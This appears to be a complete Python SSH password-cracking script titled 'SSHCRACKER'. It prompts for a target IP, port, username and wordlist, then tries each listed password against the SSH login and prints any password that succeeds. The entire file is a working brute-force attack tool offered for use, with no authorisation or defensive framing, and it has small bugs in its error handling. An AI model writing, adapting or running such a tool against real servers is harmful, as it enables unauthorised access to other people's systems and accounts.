###Author: Omar Rajab
###Company: BlackHatch
import time
import paramiko
import pyfiglet

ascii_banner = pyfiglet.figlet_format("SSHCRACKER")
print(ascii_banner)


host=input("Enter IP Address:")
port=input("Enter Port Number: ")
user=input("Enter Username:")
dict1=input("Enter Dictionary File Location:")
print("NOTE: PRESS CTRL+C WHEN YOU SEE PASSWORD FOUND")


def connect(host, port, user, dict1):
    errors=0
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port, user, dict1)
        print('[+] Password Found: ' + dict1)
        return ssh
    except Exception as e:
        if errors > 5:
            print("!!! Too Many Socket Timeouts")
            exit(0)
        elif 'read_nonblocking' in str(e):
            time.sleep(5)
            return connect(host, port, user, dict1)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            return connect(host, port, user, dict1)




with open(dict1, 'r') as infile:
    for line in infile:
        password = line.strip('\n')
        print("Testing: " + str(password))
        connect(host, port, user, password)
